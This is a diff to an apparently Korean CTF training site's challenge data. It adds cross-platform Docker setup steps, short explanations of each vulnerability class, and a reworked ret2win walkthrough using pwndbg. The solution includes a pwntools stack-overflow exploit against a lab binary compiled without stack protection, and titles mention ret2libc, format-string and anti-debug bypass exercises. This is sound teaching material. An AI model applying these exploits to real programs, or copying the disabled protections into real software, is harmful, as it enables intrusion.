@@ -44,15 +44,25 @@ LAB_SETUP = {
     "docker_path": {
         "title": "방법 A: Docker Desktop으로 실습 환경 켜기",
         "steps": [
-            "Windows 검색(돋보기)에서 'Docker Desktop'을 입력해 실행합니다.",
-            "최초 실행이라면 이용약관에 동의하고, 'Use WSL 2 based engine' 옵션은 기본값(체크됨)을 그대로 둡니다.",
-            "시스템 트레이(작업표시줄 오른쪽)의 고래 아이콘이 움직이다가 멈추고 'Docker Desktop is running' 상태가 될 때까지 기다립니다 (수십 초~1분).",
-            "터미널에서 docker info 를 실행해 에러 없이 정보가 출력되면 데몬이 켜진 것입니다. ('cannot connect' 에러가 나오면 아직 켜지는 중이거나 실행되지 않은 것입니다.)",
-            "(선택) Docker Desktop 설정(Settings) → General → 'Start Docker Desktop when you log in' 체크 — 매번 수동 실행하지 않아도 됩니다.",
+            "Docker Desktop을 실행합니다.\n"
+            "  · Windows: 검색(돋보기)에서 'Docker Desktop' 입력 후 실행\n"
+            "  · macOS: Spotlight(⌘+Space)에서 'Docker' 검색, 또는 Applications 폴더에서 Docker.app 실행\n"
+            "  · Linux: 앱 메뉴에서 'Docker Desktop' 실행, 또는 GUI 없이 CLI만 쓴다면 sudo systemctl start docker",
+            "최초 실행이라면 이용약관에 동의합니다. Windows에서는 'Use WSL 2 based engine' 옵션이 뜨는데 기본값(체크됨)을 그대로 둡니다 — 이 옵션은 Windows 전용이라 macOS/Linux Docker Desktop에는 이 화면 자체가 없습니다(그대로 다음 단계로).",
+            "데몬이 켜질 때까지 기다립니다 (수십 초~1분).\n"
+            "  · Windows: 시스템 트레이(작업표시줄 오른쪽)\n"
+            "  · macOS: 화면 상단 메뉴 막대(menu bar)\n"
+            "  · Linux: 데스크톱 환경에 따라 시스템 트레이 또는 알림 영역\n"
+            "고래 아이콘이 움직이다가 멈추고 'Docker Desktop is running' 상태가 되면 완료입니다.",
+            "터미널에서 docker info 를 실행해 에러 없이 정보가 출력되면 데몬이 켜진 것입니다 ('cannot connect' 에러가 나오면 아직 켜지는 중이거나 실행되지 않은 것). 이 명령은 Windows(PowerShell/명령 프롬프트)·macOS(Terminal)·Linux(bash/zsh) 어디서든 완전히 동일합니다.",
+            "(선택) Docker Desktop 설정(Settings) → General → 'Start Docker Desktop when you log in' 체크 — 매번 수동 실행하지 않아도 됩니다. (Windows/macOS/Linux Docker Desktop 모두 동일한 위치)",
             "이 페이지에서 Dockerfile을 다운로드해 챌린지 소스 파일들과 같은 폴더에 저장합니다.",
-            "그 폴더에서: docker build -t pwnlab .   (최초 1회, 이미지 빌드에 몇 분 걸릴 수 있음)",
-            "docker run --rm -it -v \"$(pwd)\":/lab pwnlab   (컨테이너 실행, 현재 폴더가 /lab에 마운트됨)",
-            "컨테이너 프롬프트가 뜨면 준비 완료 — cd /lab 후 각 챌린지의 빌드 명령을 그대로 실행하면 됩니다.",
+            "그 폴더에서 이미지를 빌드합니다 (최초 1회, 몇 분 걸릴 수 있음) — 이 명령도 OS/셸에 관계없이 동일합니다:\n"
+            "docker build -t pwnlab .",
+            "컨테이너를 실행합니다 (현재 폴더가 컨테이너의 /lab에 마운트됨). 아래 명령은 Windows(PowerShell)·macOS·Linux(bash/zsh) 어디서든 똑같이 씁니다:\n"
+            "docker run --rm -it -v \"$(pwd):/lab\" pwnlab\n"
+            "⚠️ 흔한 실수: 따옴표를 $(pwd)에만 걸고 :/lab을 따옴표 밖에 두면(예: -v \"$(pwd)\":/lab) PowerShell에서 'invalid reference format' 오류가 납니다 — 반드시 콜론과 /lab까지 따옴표 안에 함께 넣으세요(위처럼 \"$(pwd):/lab\").",
+            "컨테이너 프롬프트가 뜨면 준비 완료 — cd /lab 후 각 챌린지의 빌드 명령을 그대로 실행하면 됩니다. (컨테이너 안은 항상 Linux bash이므로 호스트가 Windows/macOS/Linux 무엇이든 이 단계부터는 동일합니다.)",
         ],
         "troubleshooting": [
             "'WSL 2 installation is incomplete' 오류: 관리자 권한 PowerShell에서 wsl --update 실행 후 Docker Desktop을 다시 시작하세요.",
@@ -111,6 +121,7 @@ CHALLENGES = [
         "title": "ret2win: 스택 버퍼 오버플로우로 숨겨진 함수 호출하기",
         "difficulty": "입문",
         "tool_focus": "gdb",
+        "meaning": "스택 버퍼 오버플로우(Stack Buffer Overflow) — 고정 크기 버퍼보다 큰 입력을 받아 반환 주소(return address)까지 덮어써 실행 흐름을 조작하는 가장 기본적인 메모리 손상 취약점입니다.",
         "situation": (
             "바이너리 안에는 절대 호출되지 않는 win() 함수가 숨어 있습니다. 사용자 입력을 받는 "
             "vulnerable() 함수는 64바이트 버퍼에 256바이트까지 읽어들여 스택 버퍼 오버플로우가 "
@@ -150,21 +161,27 @@ int main(void) {
         "build_steps": [
             "위 소스를 ret2win.c로 저장합니다 (아래 [소스 다운로드] 버튼 사용 가능).",
             "실습 환경(Docker 컨테이너 또는 WSL) 안에서: gcc -fno-stack-protector -no-pie -o ret2win ret2win.c",
+            "이때 \"'read' writing 256 bytes into a region of size 64 overflows the destination [-Wstringop-overflow=]\" 경고가 뜨는 것이 정상입니다 — GCC가 이 오버플로우를 정적으로 미리 감지한 것일 뿐 에러가 아니며, 컴파일은 그대로 성공하고 실행 파일도 정상적으로 만들어집니다(이 경고 자체가 취약점이 실제로 존재한다는 걸 컴파일러가 확인해주는 셈입니다). 무시하고 다음 단계로 진행하세요.",
             "-fno-stack-protector: 스택 카나리 비활성화 (입문 단계에서는 카나리 우회까지 배우지 않도록), -no-pie: 실행할 때마다 주소가 바뀌지 않도록 고정 (오프셋 계산에 집중하기 위함)",
-            "file ./ret2win 로 64비트 ELF인지 확인, (pwntools가 있다면) checksec --file=ret2win 로 어떤 보호기법이 꺼져 있는지 확인합니다.",
+            "readelf -h ret2win | head -5 로 64비트 ELF(Class: ELF64)인지 확인하고, checksec --file=ret2win (Docker 이미지에 pwntools와 함께 기본 설치됨)로 스택 카나리·NX·PIE 등 어떤 보호기법이 꺼져 있는지 확인합니다. (이 Docker 이미지에는 file 명령이 설치되어 있지 않아 file ./ret2win은 'command not found'로 실패합니다 — 대신 readelf를 쓰세요.)",
         ],
         "analysis_steps": [
             "objdump -d ret2win | grep -A2 '<win>:' 로 win() 함수의 시작 주소를 확인합니다.",
-            "gdb ./ret2win 으로 실행한 뒤 python3 -c \"from pwn import *; print(cyclic(200))\" 으로 만든 패턴을 입력값으로 줍니다.",
-            "프로그램이 세그폴트로 죽으면 gdb에서 info registers 로 rip(또는 다음 실행될 주소가 저장된 스택 위치)를 확인합니다.",
-            "python3 -c \"from pwn import *; print(cyclic_find(0x<크래시난값>))\" 으로 정확한 오프셋을 계산합니다.",
-            "오프셋만큼 채운 뒤 win() 주소를 8바이트 리틀엔디언으로 이어붙인 payload를 다시 넣어 flag가 출력되는지 확인합니다.",
+            "gdb ./ret2win 로 실행합니다. pwndbg가 이미 로드되어 있으므로 pwndbg> 프롬프트에서 바로 cyclic 200 을 입력하세요 — 200바이트 패턴이 그 자리에서 출력됩니다. (⚠️ python3 -c \"...\" 를 pwndbg 프롬프트에 그대로 입력하면 'Undefined command: \"python3\"' 오류가 납니다 — 이건 셸 명령이라 gdb 프롬프트가 아니라 별도 터미널에서 실행해야 합니다. pwndbg의 cyclic 명령을 쓰면 터미널을 오갈 필요 없이 gdb 안에서 바로 끝낼 수 있습니다.)",
+            "pwndbg> run 을 입력해 프로그램을 실행하고, 'Enter your name:' 프롬프트가 뜨면 방금 출력된 cyclic 패턴을 그대로 붙여넣고 Enter를 누릅니다.",
+            "SIGSEGV로 멈추면 pwndbg가 화면을 자동으로 여러 구역으로 나눠 보여줍니다: 상단 역어셈블리(► 화살표가 멈춘 위치를 가리킴 — 이 바이너리는 vulnerable() 함수의 ret 명령 직전에서 멈추며, ret 명령 옆에 ret <0x6161617461616173> 처럼 실제로 점프하려던 깨진 주소가 이미 표시됨), 중간 [STACK](스택 상위 몇 칸에 저장된 cyclic 패턴 원문), [BACKTRACE](콜스택 — 1번 프레임에 방금 그 깨진 주소가 그대로 한 번 더 보임), 맨 아래 [LAST SIGNAL](SIGSEGV로 죽었다는 표시 — fault address가 0x0으로 나올 수 있는데, 이건 비정규(non-canonical) 주소로 점프하려다 난 예외라 원래 이렇게 나오는 정상적인 경우입니다). 다음 단계에 필요한 값은 이미 화면에 나와 있습니다 — 역어셈블리의 ret <0x...> 옆 값이나 [BACKTRACE] 1번 프레임 값을 그대로 쓰면 되고, 별도로 x/gx $rsp를 입력할 필요는 없습니다(입력해도 같은 값이 나옵니다 — 화면에 이미 보이면 그걸 쓰면 됩니다).",
+            "화면에서 읽은 그 16진수 값을 cyclic -l 뒤에 그대로 붙여 입력합니다 — 예를 들어 역어셈블리나 [BACKTRACE]에 0x6161617461616173 이라고 나왔다면 pwndbg> cyclic -l 0x6161617461616173 처럼 그 숫자를 통째로 복사해 붙여넣으면 됩니다(<확인한값> 자리에 실제로 화면에 보이는 0x로 시작하는 그 값을 그대로 넣는 것이지, 다른 곳에서 값을 찾는 게 아닙니다). 그러면 'Found at offset 72'처럼 정확한 오프셋이 바로 출력됩니다 — 이것도 gdb 안에서 바로 됩니다(pwntools의 cyclic_find와 동일한 결과, 별도 터미널 불필요).",
+            "⚠️ 환경에 따라(주로 Windows Terminal + Docker Desktop 조합) pwndbg> cyclic -l ... 이 UnicodeDecodeError로 실패할 수 있습니다 — pwndbg 자체의 알려진 문제이지 명령이나 값이 잘못된 게 아닙니다. 이 경우 gdb를 나온 뒤(quit) 같은 컨테이너 터미널에서 일반 python3 -c \"from pwn import *; print(cyclic_find(0x6161617461616173))\" 로 그대로 실행하면 우회됩니다(gdb에 내장된 pwndbg의 Python이 아니라 독립된 python3 프로세스라 같은 오류를 피해갑니다). 이때 \"cyclic_find() expected an integer argument <= 0xffffffff... Truncating the data at 4 bytes\" 경고가 뜨는 것도 정상입니다 — cyclic 패턴은 기본 4바이트 단위로 고유해서, 8바이트 크래시 값의 앞 4바이트만으로도 정확한 오프셋(72)을 구할 수 있기 때문에 pwntools가 자동으로 잘라서 계산한 것뿐입니다.",
+            "아래 [익스플로잇 템플릿] 섹션의 [다운로드] 버튼을 눌러 exploit.py를 받습니다 — ret2win.c/Dockerfile과 같은 폴더에 저장되며, 그 폴더가 이미 컨테이너의 /lab에 마운트되어 있으므로 Windows에서 메모장/VS Code로 직접 열어 수정해도 컨테이너 안에 바로 반영됩니다. 파일 안의 OFFSET = None 줄을 OFFSET = 72 (방금 구한 값)로 바꿔 저장합니다.",
+            "gdb 안(pwndbg>)이 아니라 컨테이너의 일반 bash 프롬프트에서 실행합니다 — pwndbg>에 계시다면 먼저 quit으로 gdb를 나온 뒤, root@...:/lab# 프롬프트에서 python3 exploit.py 를 입력하면 flag가 출력됩니다.",
         ],
         "hints": [
             "win()은 main에서 절대 호출되지 않습니다 — objdump나 Ghidra의 Symbol Tree에서 이름으로 직접 찾아야 합니다.",
             "read(0, buffer, 256)에서 버퍼 크기(64)보다 훨씬 큰 256을 읽기 때문에 입력 길이 제한이 사실상 없습니다.",
             "cyclic() 패턴은 4~8바이트 단위로 겹치지 않는 문자열이라, 크래시난 주소값 하나만 알면 정확한 오프셋을 역산할 수 있습니다.",
-            "x86-64에서 buffer[64] 바로 다음엔 저장된 rbp(8바이트)가 있고 그 다음이 return address이므로, 오프셋은 대략 72 근처인 경우가 많습니다 — 그래도 반드시 cyclic_find로 직접 확인하세요 (컴파일러/OS에 따라 달라질 수 있습니다).",
+            "x86-64에서 buffer[64] 바로 다음엔 저장된 rbp(8바이트)가 있고 그 다음이 return address이므로, 오프셋은 대략 72 근처인 경우가 많습니다 — 그래도 반드시 cyclic -l(또는 cyclic_find)로 직접 확인하세요 (컴파일러/OS에 따라 달라질 수 있습니다).",
+            "pwndbg가 로드돼 있다면 cyclic/cyclic -l 명령을 gdb 프롬프트에서 바로 쓸 수 있습니다 — python3 -c \"from pwn import *; ...\"는 셸(터미널) 명령이라 gdb 프롬프트(pwndbg>)에 입력하면 동작하지 않습니다.",
+            "pwndbg> cyclic -l ... 이 UnicodeDecodeError로 실패하면 pwndbg 자체의 환경 관련 문제입니다 — gdb를 나온 뒤 python3 -c \"from pwn import *; print(cyclic_find(0x...))\" 로 같은 값을 넣어 계산하면 우회됩니다.",
         ],
         "exploit_template": """#!/usr/bin/env python3
 from pwn import *
@@ -183,17 +200,18 @@ payload = b'A' * OFFSET + p64(win_addr)
 p.send(payload)
 p.interactive()
 """,
-        "solution": """1. gcc -fno-stack-protector -no-pie -o ret2win ret2win.c 로 빌드합니다.
-2. objdump -d ret2win | grep -A2 '<win>:' 로 win() 주소를 확인합니다 (예: 0x401196 — 실제 값은 환경마다 다릅니다).
-3. gdb ./ret2win 실행 후 run 하고, python3 -c "from pwn import *; print(cyclic(200))" 결과를 입력합니다.
-4. 세그폴트 후 info registers 로 다음 실행 주소로 쓰이려던 값을 확인하고,
-   python3 -c "from pwn import *; print(cyclic_find(0xVALUE))" 로 정확한 오프셋을 구합니다.
-5. 아래처럼 exploit.py를 작성해 실행하면 flag가 출력됩니다.
+        "solution": """1. gcc -fno-stack-protector -no-pie -o ret2win ret2win.c 로 빌드합니다 (스택 오버플로우 경고가 뜨지만 정상 — 컴파일은 성공합니다).
+2. objdump -d ret2win | grep -A2 '<win>:' 로 win() 주소를 확인합니다 (예: 0x4011b6 — 실제 값은 환경마다 다릅니다).
+3. gdb ./ret2win 실행 후 pwndbg> 프롬프트에서 바로 cyclic 200 입력 (python3을 gdb 프롬프트에서 직접 실행하면 안 됩니다 — "Undefined command" 오류).
+4. pwndbg> run 입력 후 "Enter your name:"에 3번의 패턴을 붙여넣습니다.
+5. SIGSEGV로 멈추면(이 바이너리는 vulnerable() 함수 안, ret 명령 직전에서 멈춤) pwndbg가 자동으로 보여주는 화면에서 ret 명령 옆의 <0x...> 값이나 [BACKTRACE] 1번 프레임 값을 그대로 읽습니다 (예: 0x6161617461616173 — 화면에 이미 나와 있어 x/gx $rsp를 따로 입력할 필요 없음).
+6. pwndbg> cyclic -l 0x6161617461616173 를 입력하면 "Found at offset 72"가 바로 출력됩니다 — 별도 터미널 없이 gdb 안에서 끝남.
+7. gdb를 나온 뒤(quit) 아래처럼 exploit.py를 작성해 일반 셸에서 실행하면 flag가 출력됩니다.
 
 from pwn import *
 context.binary = elf = ELF('./ret2win')
 p = process('./ret2win')
-OFFSET = 72  # 3~4단계에서 직접 구한 값으로 교체
+OFFSET = 72  # 5~6단계에서 직접 구한 값으로 교체
 payload = b'A' * OFFSET + p64(elf.symbols['win'])
 p.send(payload)
 p.interactive()
@@ -205,6 +223,7 @@ p.interactive()
         "title": "ret2system: ret2libc 맛보기 — 실제 라이브러리 함수 호출하기",
         "difficulty": "중급",
         "tool_focus": "gdb",
+        "meaning": "ret2libc — NX(스택 실행 방지)가 켜져 있어도 이미 존재하는 라이브러리 함수(system 등)를 실행 흐름 조작만으로 호출해 임의 명령을 실행시키는 기법입니다.",
         "situation": (
             "ret2win과 달리 이번에는 '정답 함수'가 없습니다. 대신 system() 함수가 바이너리에 "
             "링크되어 있지만 어디서도 호출되지 않습니다. 스택 버퍼 오버플로우로 system()을 "
@@ -334,6 +353,7 @@ movaps 같은 SSE 명령어가 16바이트로 정렬되지 않은 스택 때문�
         "title": "fmtstr: 포맷 스트링 취약점으로 스택 값 읽어내기",
         "difficulty": "중급",
         "tool_focus": "gdb",
+        "meaning": "포맷 스트링 취약점(Format String Vulnerability) — 사용자 입력이 printf류 함수의 포맷 문자열로 그대로 사용되면 %x/%p 같은 지정자로 스택 메모리를 읽거나(Arbitrary Read), 나아가 쓰기까지 가능해지는 취약점입니다.",
         "situation": (
             "지금까지는 모두 '스택 버퍼 오버플로우'였습니다. 이번엔 완전히 다른 취약점입니다: "
             "사용자 입력이 printf의 포맷 문자열로 그대로 사용됩니다. 이 프로그램은 스택에 숨겨진 "
@@ -419,6 +439,7 @@ int main(void) {
         "title": "crackme v1: Ghidra로 비밀번호 로직 분석하기",
         "difficulty": "입문",
         "tool_focus": "ghidra",
+        "meaning": "정적 분석(Static Analysis) 기초 — 프로그램을 실행하지 않고 디컴파일러(Ghidra)로 로직을 읽어 검증 알고리즘을 파악하는, 리버싱의 가장 기본적인 접근법입니다.",
         "situation": (
             "비밀번호를 입력받아 맞으면 flag를 출력하는 프로그램입니다. 소스 없이 컴파일된 "
             "바이너리만 주어졌다고 가정하고, Ghidra로 디컴파일해 올바른 비밀번호를 알아내는 것이 목표입니다."
@@ -505,6 +526,7 @@ int main(void) {
         "title": "keygen_check: 알고리즘 기반 시리얼 검증 분석하기",
         "difficulty": "중급",
         "tool_focus": "ghidra",
+        "meaning": "keygen(시리얼 생성기) 사고방식 — 검증 알고리즘을 분석해 '정답 하나'를 찾는 게 아니라 조건을 만족하는 값을 스스로 만들어내는, 알고리즘 자체를 역공학하는 연습입니다.",
         "situation": (
             "crackme v1은 '고정된 하나의 정답'을 찾는 문제였습니다. 이번엔 다릅니다 — 이 프로그램은 "
             "'XXXX-XXXX' 형식의 시리얼을 받아 자릿수마다 가중치를 곱한 합(체크섬)이 특정 값과 같은지만 "
@@ -590,6 +612,7 @@ int main(void) {
         "title": "antidebug_crackme: 안티 디버깅 탐지 우회하기",
         "difficulty": "중급~고급",
         "tool_focus": "ghidra",
+        "meaning": "안티 디버깅(Anti-Debugging) — 프로그램이 스스로 디버거 부착 여부를 검사해 분석을 방해하는 방어 기법과, 이를 우회하는 정적/동적 접근법입니다.",
         "situation": (
             "이 프로그램은 시작하자마자 디버거(ptrace)가 붙어있는지 검사하고, 감지되면 즉시 "
             "종료합니다. gdb로 무작정 실행하면 비밀번호를 입력해보기도 전에 프로그램이 꺼져버립니다."
@@ -665,6 +688,7 @@ int main(void) {
         "title": "인코딩 체인 풀기: 4단계를 벗겨내면 flag",
         "difficulty": "입문",
         "tool_focus": "cyberchef",
+        "meaning": "다단계 인코딩(Layered Encoding) — Base64/Hex/ROT13 등 여러 인코딩이 겹겹이 씌워진 데이터를 순서대로 식별하고 벗겨내는, CTF Misc 카테고리의 기본 패턴입니다.",
         "situation": (
             "CTF Misc 카테고리에서 가장 흔한 유형입니다: 문자열 하나가 주어지는데, 겉보기엔 "
             "Base64 같지만 디코딩해도 바로 flag가 나오지 않습니다. 여러 인코딩이 겹겹이 씌워져 "
@@ -711,6 +735,7 @@ print(flag)  # MISC{l4y3rs_0f_3nc0d1ng}
         "title": "보이지 않는 flag: 제로폭 문자 스테가노그래피",
         "difficulty": "중급",
         "tool_focus": "python",
+        "meaning": "텍스트 스테가노그래피(Text Steganography) — 화면에 보이지 않는 제로폭 유니코드 문자에 데이터를 숨기는 기법으로, 실제 워터마킹·정보 유출 탐지에도 쓰입니다.",
         "situation": (
             "평범해 보이는 메모 한 줄이 주어졌습니다. 화면에는 아무 이상이 없어 보이지만, "
             "실제로는 눈에 보이지 않는 유니코드 문자들이 뒤에 숨어 있습니다."
@@ -753,6 +778,7 @@ print(flag)  # MISC{z3ro_w1dth_1s_1nv1s1bl3}
         "title": "흩어진 단서 조합하기: 가상 온보딩 문서 OSINT",
         "difficulty": "입문",
         "tool_focus": "logic",
+        "meaning": "OSINT(공개출처정보) 교차 대조 — 하나의 출처만으로는 결론이 나지 않고 여러 문서·단서를 조합해야 답을 찾는, 실제 정보 수집 조사의 사고 흐름입니다.",
         "situation": (
             "가상의 회사(ACME Corp)의 내부 온보딩 문서 일부가 주어집니다. 실제 인물이나 회사가 "
             "아닌, 교육 목적으로 만든 가상의 문서입니다. flag는 문서에 그대로 적혀있지 않고, "
